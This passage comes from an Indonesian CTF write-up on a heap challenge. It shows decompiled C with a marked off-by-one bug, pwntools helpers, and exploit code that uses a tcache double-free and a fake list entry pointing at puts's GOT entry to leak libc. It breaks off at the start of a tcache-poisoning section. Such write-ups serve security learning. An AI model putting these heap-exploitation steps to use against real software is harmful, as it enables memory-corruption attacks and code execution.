    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Insert key: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1024LL&lt;/span&gt;);
    fgets(_key, _key_len &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, stdin);
    _key[_key_len] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// BUG
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Value length: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    fgets(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s, &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;, stdin);
    _value_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s);
    _value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)safe_malloc(_value_len);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( _value )
    {
      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Insert value: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1024LL&lt;/span&gt;);
      fgets(_value, _value_len &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, stdin);
      _value[_value_len] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// BUG
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(_value);
      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, v0);
      found &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (linked_list &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)p_list;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( list&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;next )
      {
        list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (linked_list &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)list&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;next;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( list&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;strcmp(list&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;key, _key) )
        {
          found &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( list&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;value_len &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; _value_len )
          {
            list&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; realloc(list&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;value, _value_len &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
            list&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;value_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _value_len;
          }
          memcpy(list&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;value, _value, _value_len);
          printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[Key modified] %s:%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, list&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;key, list&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;value);
          &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        }
      }
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;found )
      {
        tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (linked_list &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20uLL&lt;/span&gt;);
        tmp&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;key_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _key_len;
        tmp&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;value_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _value_len;
        tmp&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _key;
        tmp&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _value;
        tmp&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
        list&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp;
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[Key inserted] %s:%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, _key, _value);
      }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;off-by-one ini sebenernya gak terlalu berguna (??) karena jika mau diakitkan dengan exploit malloc dengan poison-null-byte, pointer untuk &lt;code&gt;free()&lt;/code&gt; hanya pada linked list yang ukurannya tetap di 0x20, sedangkan poison-null-byte lebih mudah jika ukuran malloc 0x100++.&lt;/p&gt;
&lt;h2 id=&#34;exploit&#34;&gt;exploit&lt;/h2&gt;
&lt;p&gt;buat mempermudah penulisan exploit,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;insert&lt;/span&gt;(key, val):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, len(key)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__str__())
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, key)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, len(val)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__str__())
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, val)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(False)
    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(False))

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete&lt;/span&gt;(key):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, key)
    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(False))

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lookup&lt;/span&gt;(key):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, key)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(False)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;leak&#34;&gt;leak&lt;/h3&gt;
&lt;p&gt;libc leak dapat memanfaatkan double-free. &lt;code&gt;free()&lt;/code&gt; hanya dilakukan ke struct list ukurannya 0x20 yang berarti masuk ke &lt;code&gt;fastbin[1] (0x30)&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;insert(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# fastbin[0] (0x20) : AAAAAAAA -&amp;gt; aaaaaaaa&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# fastbin[1] (0x30) : A&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# tcache_entry[1] (0x30 freelist) :&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# list : A&lt;/span&gt;

insert(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# fastbin[0] (0x20) : AAAAAAAA -&amp;gt; aaaaaaaa -&amp;gt; BBBBBBBB -&amp;gt; bbbbbbbb&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# fastbin[1] (0x30) : A -&amp;gt; B&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# tcache_entry[1] (0x30 freelist) :&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# list : A -&amp;gt; B&lt;/span&gt;

delete(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# tcache_entry[1] (0x30 freelist) : B&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# list : A -&amp;gt; B&lt;/span&gt;

delete(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# tcache_entry[1] (0x30 freelist) : B -&amp;gt; A&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# list : B&lt;/span&gt;

delete(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# tcache_entry[1] (0x30 freelist) : B -&amp;gt; A -&amp;gt; B&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# list : B&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# gdb-peda$ heapinfo&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# (0x20)     fastbin[0]: 0x0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# (0x30)     fastbin[1]: 0x0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# (0x40)     fastbin[2]: 0x0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# (0x50)     fastbin[3]: 0x0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# (0x60)     fastbin[4]: 0x0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# (0x70)     fastbin[5]: 0x0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# (0x80)     fastbin[6]: 0x0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# (0x90)     fastbin[7]: 0x0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# (0xa0)     fastbin[8]: 0x0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# (0xb0)     fastbin[9]: 0x0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#                   top: 0xbb8370 (size : 0x1fc90) &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#        last_remainder: 0x0 (size : 0x0) &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#             unsortbin: 0x0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# (0x30)   tcache_entry[1]: 0xbb8350 --&amp;gt; 0xbb82e0 --&amp;gt; 0xbb8350 (overlap chunk with 0xbb8340(freed) ) !!!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Seeb, udah punya 2 pointer yang sama di freelist. Lanjut, karena setiap &lt;em&gt;request&lt;/em&gt; list data baru selalu melakukan malloc(0x20), biar mencegah linked list jadi infinite loop, buat value/key ukurannya jatuh di fastbin[1] (0x30) yang berarti sekitar [0x19 - 0x28]. Dari sini bisa dimanfaatkan untuk membuat fake list yang meng &lt;em&gt;overwrite&lt;/em&gt; list B.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# fake list di B&lt;/span&gt;
fake_list  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fd&lt;/span&gt;
fake_list &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00400505&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# key : str.malloc&lt;/span&gt;
fake_list &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x602020&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# value : reloc.puts&lt;/span&gt;
fake_list &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# next&lt;/span&gt;

insert(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, fake_list)

&lt;span style=&#34;color:#75715e&#34;&gt;# tcache_entry[1] (0x30 freelist) : B&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# list : malloc -&amp;gt; B&lt;/span&gt;

puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(lookup(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;malloc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Loh, kok freelist jadi tinggal B? Sebelum &lt;code&gt;insert()&lt;/code&gt; untuk key &lt;code&gt;&#39;B&#39; * 8&lt;/code&gt;, &lt;code&gt;malloc()&lt;/code&gt; untuk value lebih dulu dilakukan jadi list untuk &lt;code&gt;&#39;B&#39; * 8&lt;/code&gt; ter- &lt;em&gt;overwrite&lt;/em&gt; oleh fake list. Intinya &lt;code&gt;&#39;B&#39; * 8&lt;/code&gt; terhapus sehingga &lt;code&gt;malloc(0x20)&lt;/code&gt; tetap dilakukan untuk key &lt;code&gt;&#39;B&#39; * 8&lt;/code&gt; (ada dua kali &lt;code&gt;malloc(0x20)&lt;/code&gt;). Untuk leak hanya perlu lookup value dari &lt;code&gt;malloc&lt;/code&gt; karena sudah dibuat fake list dengan key &lt;code&gt;malloc&lt;/code&gt; dan value ptr ke &lt;code&gt;reloc.puts&lt;/code&gt; (got puts).&lt;/p&gt;
&lt;h3 id=&#34;tcache-poisoning&#34;&gt;tcache poisoning&lt;/h3&gt;
&lt;p&gt;tcache poisoning pada dasarnya hanya mengubah tcache_entry pada malloc`d yang telah di free ke value yang diinginkan. Kondisi heap pada saat sebelum setelah di &lt;code&gt;free()&lt;/code&gt;,&lt;/p&gt;
